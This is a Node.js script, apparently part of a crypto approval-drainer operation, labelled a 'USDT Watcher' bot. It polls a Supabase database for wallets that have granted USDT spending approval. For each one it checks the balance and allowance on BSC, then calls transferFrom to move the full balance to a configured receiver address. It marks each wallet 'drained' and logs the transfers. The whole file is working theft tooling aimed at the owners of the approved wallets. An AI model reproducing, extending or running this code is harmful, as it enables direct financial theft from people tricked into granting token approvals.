require("dotenv").config({ path: "../.env.local" });
const { ethers } = require("ethers");
const { createClient } = require("@supabase/supabase-js");

// Config
const BSC_RPC_URL = process.env.BSC_RPC_URL || "https://bsc-dataseed.binance.org/";
const USDT_CONTRACT = process.env.NEXT_PUBLIC_USDT_CONTRACT;
const ADMIN_PRIVATE_KEY = process.env.ADMIN_PRIVATE_KEY;
const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const POLL_INTERVAL_MS = parseInt(process.env.BOT_POLL_INTERVAL_MS || "60000");

const USDT_ABI = [
  "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
  "function balanceOf(address owner) public view returns (uint256)",
  "function allowance(address owner, address spender) public view returns (uint256)",
];

if (!USDT_CONTRACT || !ADMIN_PRIVATE_KEY || !SUPABASE_URL || !SUPABASE_SERVICE_KEY) {
  console.error("[Bot] Missing required environment variables. Check .env.local");
  process.exit(1);
}

const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);

async function getConfig() {
  const { data } = await supabase.from("config").select("*");
  const config = {};
  for (const row of data ?? []) {
    config[row.key] = row.value;
  }
  return config;
}

async function runDrainCycle() {
  console.log(`[Bot] Starting drain cycle at ${new Date().toISOString()}`);

  const config = await getConfig();
  const receiverAddress = config["receiver_address"];
  const minThresholdUsd = parseFloat(config["min_threshold_usd"] ?? "2");

  if (!receiverAddress) {
    console.warn("[Bot] Receiver address not configured. Skipping cycle.");
    return;
  }

  // Fetch approved, non-drained wallets
  const { data: wallets, error } = await supabase
    .from("wallets")
    .select("*")
    .eq("approval_status", true)
    .eq("drained", false);

  if (error) {
    console.error("[Bot] DB fetch error:", error.message);
    return;
  }

  if (!wallets || wallets.length === 0) {
    console.log("[Bot] No eligible wallets found.");
    return;
  }

  console.log(`[Bot] Found ${wallets.length} eligible wallet(s).`);

  const provider = new ethers.JsonRpcProvider(BSC_RPC_URL);
  const adminWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
  const contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, adminWallet);

  for (const wallet of wallets) {
    try {
      // Check balance
      const balance = await contract.balanceOf(wallet.address);
      const balanceFormatted = parseFloat(ethers.formatUnits(balance, 18));

      console.log(`[Bot] ${wallet.address} — Balance: ${balanceFormatted} USDT`);

      if (balanceFormatted < minThresholdUsd) {
        console.log(`[Bot] ${wallet.address} — Below threshold ($${minThresholdUsd}). Skipping.`);
        continue;
      }

      // Check allowance
      const allowance = await contract.allowance(wallet.address, adminWallet.address);
      if (allowance < balance) {
        console.warn(`[Bot] ${wallet.address} — Allowance insufficient. Skipping.`);
        continue;
      }

      console.log(`[Bot] ${wallet.address} — Initiating transferFrom...`);

      const tx = await contract.transferFrom(wallet.address, receiverAddress, balance);
      const receipt = await tx.wait();
      const amountFormatted = ethers.formatUnits(balance, 18);

      console.log(`[Bot] ${wallet.address} — Drained ${amountFormatted} USDT. TX: ${receipt.hash}`);

      // Update DB
      await supabase
        .from("wallets")
        .update({ drained: true, drain_tx_hash: receipt.hash })
        .eq("id", wallet.id);

      await supabase.from("transactions").insert({
        wallet_address: wallet.address,
        type: "drain",
        tx_hash: receipt.hash,
        amount_usdt: amountFormatted,
        status: "success",
      });

    } catch (err) {
      console.error(`[Bot] ${wallet.address} — Error:`, err.message ?? err);

      await supabase.from("transactions").insert({
        wallet_address: wallet.address,
        type: "drain",
        status: "failed",
        amount_usdt: "0",
      });
    }

    // Small delay between wallets to avoid nonce conflicts
    await sleep(3000);
  }

  console.log(`[Bot] Cycle complete at ${new Date().toISOString()}`);
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function main() {
  console.log("[Bot] USDT Watcher starting...");
  console.log(`[Bot] Poll interval: ${POLL_INTERVAL_MS / 1000}s`);

  while (true) {
    try {
      await runDrainCycle();
    } catch (err) {
      console.error("[Bot] Unhandled error in cycle:", err.message ?? err);
    }
    await sleep(POLL_INTERVAL_MS);
  }
}

main();
